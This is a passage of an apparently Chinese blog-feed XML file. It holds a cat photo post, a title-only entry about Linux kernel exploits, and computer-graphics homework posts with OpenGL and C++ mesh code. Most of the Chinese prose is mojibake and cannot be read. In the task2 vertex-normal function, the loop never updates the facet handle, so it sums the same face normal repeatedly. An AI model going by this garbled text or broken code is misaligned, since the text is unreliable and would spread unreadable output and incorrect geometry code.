å¥½ä¸‘233</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/d0LbeC0d43.png?imageslim" alt="mark"></p><p>å°ç¯ä¸‹å°±é€‚åˆæ€è€ƒ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DHHk9LAKgf.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/J8L798EBda.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/Djem79cGa6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/2460HE0mfJ.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/EdCAhFh0Bh.png?imageslim" alt="mark"></p><p>å°è¯•æœ€èˆ’æœçš„ç¡å§¿ã€‚ã€‚</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/EeDAkDB6bc.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/8cFBhjj9Ac.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HGJ0gIK2bI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/aE8bf81maD.png?imageslim" alt="mark"></p><p>æ•ç€ç®—æ³•ä¹¦ç¡è§‰</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DIbjJ6Cjhk.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/deAFbCe92G.png?imageslim" alt="mark"></p><p>æˆ‘æ˜¯0æ’æ·è±¹QAQ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/0kghK3mdKE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HIdB16aLb7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/4BBIk4L2CE.png?imageslim" alt="mark"></p><p>ä¸“å¿ƒç‚¹ï¼</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/jj036eiHGj.png?imageslim" alt="mark"></p><p>ä½ æ„å•¥</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bJ1iibhiCH.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DFLAIjKdjI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0alG7LB41h.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/h50ghHDb7a.png?imageslim" alt="mark"></p><p>è¿™æ˜¯è€é¼ å—</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/7khdeha147.png?imageslim" alt="mark"></p><p>è€é¼ å°±è¿™å‘³ï¼Ÿ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/BD6H22j4Bi.png?imageslim" alt="mark"></p><p>ä½ éª—è°å‘¢</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bklELf1b5K.png?imageslim" alt="mark"></p><p>æ‚Ÿç©º</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/Lb9162KEC6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0Ddb9CgJFb.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/m43dfK70cb.png?imageslim" alt="mark"></p><p>æƒ³ä½ äº†å–µ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/CHj5e6cEde.png?imageslim" alt="mark"></p>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/Todo-List/</id>
        <title><![CDATA[Todo List]]></title>
        <updated>2018-11-23T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/Todo-List/"/>
        <content type="text/html" src="https://doublemice.github.io/Todo-List/"><![CDATA[Todo List]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/The-road-to-linux-kernel-exploit/</id>
        <title><![CDATA[The Road To Linux Kernel Exploit]]></title>
        <updated>2018-11-22T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"/>
        <content type="text/html" src="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"><![CDATA[The Road To Linux Kernel Exploit]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/</id>
        <title><![CDATA[ç«é€Ÿæ¸¸æˆå½•å±å‰ªè¾‘]]></title>
        <updated>2018-11-11T11:07:14+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=27825157&cid=48041818&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/</id>
        <title><![CDATA[OpenGLè®¾è®¡å°å±‹åœºæ™¯]]></title>
        <updated>2018-11-11T11:06:00+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"><![CDATA[<h2 id="Grading-Scheme"><a href="#Grading-Scheme" class="headerlink" title="Grading Scheme"></a>Grading Scheme</h2><p>Your assignment will be graded by the following marking scheme:<br>Basic (80%)</p><ul><li>Planes (the left, right, and back walls, the ceiling and the floor)  10%</li><li>At least five different geometric primitives                  20%</li><li>At least five keyboard events (mouse event is optional)        15%</li><li>Object transformation animation (rotation, translating, scaling)  15%</li><li>General lighting control (different material properties setting)   20%</li></ul><p>Bonus (Up to 20%)</p><ul><li>Well-organized room                                       5%</li><li>Complex meaningful object constructed by different primitives      5%</li><li>Additional light (with different properties, on/off or transformation)  10%</li><li>Other creativities                                           10%</li></ul><p>Total                                                       100%<br>Note: No grade will be given if the program is incomplete.</p><h2 id="ä»£ç æ¡†æ¶è§£è¯»"><a href="#ä»£ç æ¡†æ¶è§£è¯»" class="headerlink" title="ä»£ç æ¡†æ¶è§£è¯»"></a>ä»£ç æ¡†æ¶è§£è¯»</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;GL/glut.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> GLdouble FRUSTDIM = <span class="number">100.0f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// All Setup For OpenGL Goes Here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glEnable(GL_DEPTH_TEST);</span><br><span class="line">glEnable(GL_LIGHTING);</span><br><span class="line">glEnable(GL_LIGHT0);</span><br><span class="line">glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// Here's Where We Do All The Drawing</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Place light source here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Draw walls and objects here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Add animation here</span></span><br><span class="line"></span><br><span class="line">glutSwapBuffers();</span><br><span class="line">glFlush();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reshape</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> h)</span> <span class="comment">// Resize the GL Window. w=width, h=height</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glViewport(<span class="number">0</span>, <span class="number">0</span>, (GLsizei) w, (GLsizei) h);</span><br><span class="line">glMatrixMode(GL_PROJECTION);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">glFrustum(-FRUSTDIM, FRUSTDIM, -FRUSTDIM, FRUSTDIM, <span class="number">320.</span>, <span class="number">640.</span>);</span><br><span class="line">glMatrixMode(GL_MODELVIEW);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">keyboard</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> key, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> <span class="comment">// Handle the keyboard events here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> (key) </span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span>'\<span class="number">033'</span>:<span class="comment">//press 'esc' to quit</span></span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">   <span class="comment">// Add keyboard control here</span></span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Initialization of GLUT Library */</span></span><br><span class="line">glutInit(&amp;argc, argv);</span><br><span class="line">glutInitDisplayMode(GLUT_RGBA|GLUT_DOUBLE|GLUT_DEPTH);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Create a window with title specified */</span></span><br><span class="line">glutCreateWindow(<span class="string">"Assignment 1"</span>);</span><br><span class="line">glutInitWindowSize(<span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">glutInitWindowPosition(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">init();<span class="comment">/*not GLUT call, initialize several parameters */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Register different CALLBACK function for GLUT to response </span></span><br><span class="line"><span class="comment">with different events, e.g. window sizing, mouse click or</span></span><br><span class="line"><span class="comment">keyboard stroke */</span></span><br><span class="line">glutReshapeFunc(reshape);</span><br><span class="line">glutDisplayFunc(display);</span><br><span class="line">glutKeyboardFunc(keyboard);</span><br><span class="line">glutIdleFunc(idle);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Enter the GLUT event processing loop which never returns.</span></span><br><span class="line"><span class="comment">it will call different registered CALLBACK according</span></span><br><span class="line"><span class="comment">to different events. */</span></span><br><span class="line">glutMainLoop();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹å’Œè¡¥å……"><a href="#ä¿®æ”¹å’Œè¡¥å……" class="headerlink" title="ä¿®æ”¹å’Œè¡¥å……"></a>ä¿®æ”¹å’Œè¡¥å……</h2><p>ä½œä¸šæ¡†æ¶ä¸­çš„ä¸€å¤„bugï¼š<code>main</code>å‡½æ•°ä¸­<code>glutCreateWindow</code>åº”å½“åœ¨<code>glutInitWindowSize</code>å’Œ<code>glutInitWindowPosition</code>ä¹‹åã€‚</p><p>åœ¨initå‡½æ•°ä¸­æ·»åŠ <code>glEnable(GL_NORMALIZE);</code>ï¼Œ<code>glEnable(GL_NORMALIZE)</code>æ˜¯ä½¿<code>opengl</code>è‡ªåŠ¨normalize æ³•å‘é‡ï¼Œä¹‹æ‰€ä»¥éœ€è¦è‡ªåŠ¨normalize æ³•å‘é‡æ˜¯å› ä¸ºæ³•å‘é‡ä¼šå—åˆ°<code>glScalef</code>çš„å½±å“ï¼Œå½“<code>glScalef</code>å°†ç‰©ä½“çš„åæ ‡æ”¾å¤§kå€æ—¶ï¼Œæ³•å‘é‡å˜ä¸º1/kï¼Œå› ä¸ºopenglè‡ªå·±çš„å…‰ç…§è®¡ç®—è¦æ±‚æ³•å‘é‡å•ä½åŒ–ï¼Œæ‰€ä»¥ä¸é‡æ–°å•ä½åŒ–ï¼Œè®¡ç®—ç»“æœå°±æ˜¯é”™è¯¯çš„ã€‚<br>ä¸¾ä¸ªä¾‹å­å°±æ˜¯å¦‚æœä¸æ·»åŠ <code>glEnable(GL_NORMALIZE);</code>åœ¨<code>display</code>å‡½æ•°ä¸­æ”¾å¤§ä¸€ä¸ªå‡ ä½•ç‰©ä½“å®ƒçš„äº®åº¦å°±ä¼šå˜æš—ã€‚</p><p>åœ¨<code>display</code>å‡½æ•°ä¸­æ·»åŠ <code>glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</code>ç”¨äºæ¸…é™¤ç¼“å†²åŒºã€‚</p><p>åœ¨<code>display</code>å‡½æ•°ä¸­æ‰€æœ‰ä»£ç å¤–å¥—ä¸€ä¸ª<code>glPushMatrix();</code>å’Œ<code>glPopMatrix();</code>ä¿è¯æ¯æ¬¡å›è°ƒæ—¶çš„çŸ©é˜µæ ˆä¸ºç©ºã€‚</p><h2 id="ç¨‹åºä¸€ï¼šåŠ¨ç”»æ•ˆæœæ¼”ç¤º"><a href="#ç¨‹åºä¸€ï¼šåŠ¨ç”»æ•ˆæœæ¼”ç¤º" class="headerlink" title="ç¨‹åºä¸€ï¼šåŠ¨ç”»æ•ˆæœæ¼”ç¤º"></a>ç¨‹åºä¸€ï¼šåŠ¨ç”»æ•ˆæœæ¼”ç¤º</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/%E4%BD%9C%E4%B8%9A%E4%B8%80/%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C" target="_blank" rel="noopener">æºç </a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/0bFl5AJ2L5.png?imageslim" alt="mark"></p><h2 id="ç¨‹åºäºŒï¼š3D-room-scene"><a href="#ç¨‹åºäºŒï¼š3D-room-scene" class="headerlink" title="ç¨‹åºäºŒï¼š3D room scene"></a>ç¨‹åºäºŒï¼š3D room scene</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/ä½œä¸šä¸€/æˆ¿é—´è®¾è®¡" target="_blank" rel="noopener">æºç </a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/h4G05EK5Cb.png?imageslim" alt="mark"></p><iframe src="//player.bilibili.com/player.html?aid=34258956&cid=60010777&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/</id>
        <title><![CDATA[è®¡ç®—æœºå›¾å½¢å­¦finalal_project:MeshViewer]]></title>
        <updated>2018-11-09T12:03:21+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"><![CDATA[<h2 id="ä»£ç è§£è¯»"><a href="#ä»£ç è§£è¯»" class="headerlink" title="ä»£ç è§£è¯»"></a>ä»£ç è§£è¯»</h2><p>a.é¦–å…ˆä»<code>meshviewer.cpp</code>çœ‹èµ·ï¼Œé‡Œé¢åŒ…å«mainå‡½æ•°å…¥å£ï¼Œæ‰“å°ä½¿ç”¨è¯´æ˜ï¼Œè®¾ç½®çª—å£ä¿¡æ¯ï¼Œåˆå§‹åŒ–ç¯å…‰æè´¨ç­‰ä¿¡æ¯ï¼Œåˆ›å»ºèœå•ï¼Œç»˜åˆ¶å›¾åƒï¼Œçª—å£å¤§å°å˜åŒ–å›è°ƒï¼Œé¼ æ ‡ç‚¹å‡»å’Œç§»åŠ¨å›è°ƒï¼Œé»˜è®¤å›è°ƒï¼Œé”®ç›˜å›è°ƒï¼Œç½‘æ ¼æ¨¡å‹å¤„ç†ï¼Œä¸»å¾ªç¯</p><p>b.ç„¶åè¦è¯»æ‡‚çš„æ˜¯<code>MeshInterface.h</code>æ–‡ä»¶ï¼ŒåŒ…å«ç½‘æ ¼æ¨¡å‹å¤„ç†çš„æ“ä½œï¼Œäº†è§£<code>glNewList</code>å’Œ<code>glCallList</code></p><p>c.æ¥ç€çœ‹å†…æ ¸å¤´æ–‡ä»¶ï¼Œ<code>Kernal.h</code>å’Œ<code>ExKernal.h</code>é‡ŒåŒ…å«äº†æ‰€æœ‰åé¢å†™ä»£ç è¦ç”¨åˆ°çš„å‡½æ•°å£°æ˜ï¼Œ<code>Kernal.h</code>ä¸­è¦æ³¨æ„çš„æ˜¯ä½•ç§åŠè¾¹å¥æŸ„çš„è½¬æ¢å‡½æ•°ï¼Œ<code>ExKernal.h</code>ä¸­çš„é«˜çº§åŠŸèƒ½å‡½æ•°éœ€è¦äº†è§£</p><h2 id="æç¤º"><a href="#æç¤º" class="headerlink" title="æç¤º"></a>æç¤º</h2><p>a.å…¶ä¸­1. 2. 4. 5çš„å‡½æ•°å£°æ˜åœ¨ mesh/extension/ExKernelT.h (æˆªå›¾å¦‚ä¸‹)<br>å‡½æ•°å®ç°è¯·åœ¨mesh/extension/ExkernelT.cpp ä¸­å®Œæˆ (åŠ¡å¿…)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/ie20LdjLk0.png?imageslim" alt="mark"></p><p>b.å…¶ä¸­3çš„å‡½æ•°å£°æ˜åœ¨read_write/read_write.h<br>å‡½æ•°å®ç°è¯·åœ¨read_write/read_write.cpp ä¸­å®Œæˆ (åŠ¡å¿…)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/JmeG2b7D19.png?imageslim" alt="mark"></p><p>c.è¯·æŠŠæ•´ä¸ªä»£ç çœ‹æ˜ç™½ï¼Œé‡Œé¢å®ç°äº†å„ç§åŸºæœ¬æ“ä½œï¼Œä¾‹å¦‚æ±‚ä¸‰è§’ç½‘æ ¼ä¸­æ¯ä¸ªä¸‰è§’å½¢çš„é‡å¿ƒã€æ±‚æ¯ä¸ªä¸‰è§’é¢ç‰‡çš„æ³•å‘ç­‰ç­‰ã€‚</p><p>d.ç¨‹åºè¿è¡Œæˆªå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/eaf9Ghl9AG.png?imageslim" alt="mark"></p><p>e.é¼ æ ‡ç‚¹å‡»å³é”®ï¼Œä¼šå‡ºç°ä¸€ä¸ªæ“ä½œç•Œé¢ï¼Œé‡Œé¢æœ‰ä¸€äº›ç¯å…‰å’Œå…¶ä»–ç»˜åˆ¶æ•ˆæœã€‚</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/Gga208dGIg.png?imageslim" alt="mark"></p><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><blockquote><p>è®¡ç®—ä¸‰è§’ç½‘æ ¼ä¸­æ¯ä¸ªä¸‰è§’å½¢(face)çš„é¢ç§¯ï¼›10åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸ºï¼š Scalar calc_facet_area(const FacetHandle&amp; _fh); //ç»™å®šä¸€ä¸ªä¸‰è§’é¢ç‰‡ï¼Œè®¡ç®—å®ƒçš„é¢ç§¯<br>Tips: å¯ä»¥æ ¹æ®ç¨‹åºè¾“å‡ºç»“æœåˆ¤å®šæ˜¯å¦è®¡ç®—æ­£ç¡®ï¼Œä¾‹å¦‚ï¼Œè¾“å…¥æ¨¡å‹cow.offï¼Œå®ƒçš„æ‰€æœ‰ä¸‰è§’é¢ç‰‡ä¸­ï¼Œé¢ç§¯æœ€å¤§çš„ä¸‰è§’é¢ç‰‡çš„é¢ç§¯ä¸ºï¼šThe maximal area of the mesh is: 0.0494426</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Scalar</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_facet_area(<span class="keyword">const</span> FacetHandle&amp; _fh)&#123;<span class="comment">/////è®¡ç®—ä¸‰è§’å½¢çš„é¢ç§¯</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">///å¾—åˆ°åŠè¾¹å¥æŸ„</span></span><br><span class="line">    HalfedgeHandle&amp; hh1 = halfedge_handle(_fh);</span><br><span class="line">    HalfedgeHandle&amp; hh2 = next_halfedge_handle(hh1);</span><br><span class="line">    HalfedgeHandle&amp; hh3 = next_halfedge_handle(hh2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////ç”±åŠè¾¹å¥æŸ„å¾—åˆ°è¾¹å¥æŸ„</span></span><br><span class="line">    EdgeHandle&amp; eh1 = edge_handle(hh1);</span><br><span class="line">    EdgeHandle&amp; eh2 = edge_handle(hh2);</span><br><span class="line">    EdgeHandle&amp; eh3 = edge_handle(hh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////ç”±è¾¹å¥æŸ„å¾—åˆ°å„è¾¹é•¿</span></span><br><span class="line">    <span class="keyword">float</span> a = calc_edge_length(eh1);</span><br><span class="line">    <span class="keyword">float</span> b = calc_edge_length(eh2);</span><br><span class="line">    <span class="keyword">float</span> c = calc_edge_length(eh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////åˆ©ç”¨æµ·ä¼¦å…¬å¼æ±‚é¢ç§¯s=sqrt(p(p-a)(p-b)(p-c))</span></span><br><span class="line">    Scalar area = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> p = (a + b + c) / <span class="number">2</span>;</span><br><span class="line">    area = <span class="built_in">sqrt</span>(p*(p - a)*(p - b)*(p - c));</span><br><span class="line"></span><br><span class="line">    facet_ref(_fh).area_ = area;</span><br><span class="line">    <span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/d8DIbDC712.png?imageslim" alt="mark"></p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><blockquote><p>è®¡ç®—ä¸‰è§’ç½‘æ ¼ä¸­æ¯ä¸ªé¡¶ç‚¹(vertex) çš„æ³•å‘ï¼›20åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸ºï¼šinline Normal calc_normal(const VertexHandle&amp; _vh);///è®¡ç®—é¡¶ç‚¹çš„æ³•å‘å€¼<br>Tips: æ³¨æ„å½’ä¸€åŒ–ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Normal</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_normal(<span class="keyword">const</span> VertexHandle&amp; _vh) &#123;<span class="comment">////æ›´æ–°ä¸€ä¸ªé¡¶ç‚¹çš„æ³•å‘</span></span><br><span class="line">    assert( _vh.is_valid());</span><br><span class="line">    assert( _vh.idx() &lt; vertex_size() );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Normal          norm(1,1,1);///////ç”¨normå­˜å‚¨æ±‚å¾—çš„æ³•å‘å€¼</span></span><br><span class="line">    <span class="function">Normal          <span class="title">norm</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////åœ¨æ­¤å®ç°////////////////////////////////////</span></span><br><span class="line">    HalfedgeHandle firstHH = halfedge_handle(_vh);</span><br><span class="line">    FacetHandle fh = facet_handle(firstHH);</span><br><span class="line">    norm = norm + calc_normal(fh);</span><br><span class="line">    HalfedgeHandle hh = opposite_halfedge_handle(next_halfedge_handle(firstHH));</span><br><span class="line">    <span class="keyword">while</span> (hh != firstHH) &#123;</span><br><span class="line">      norm = norm + calc_normal(fh);</span><br><span class="line">      hh = opposite_halfedge_handle(next_halfedge_handle(hh));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> norm.normalize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><blockquote><p>ç”¨OpenGLæŠŠä¸‰è§’ç½‘æ 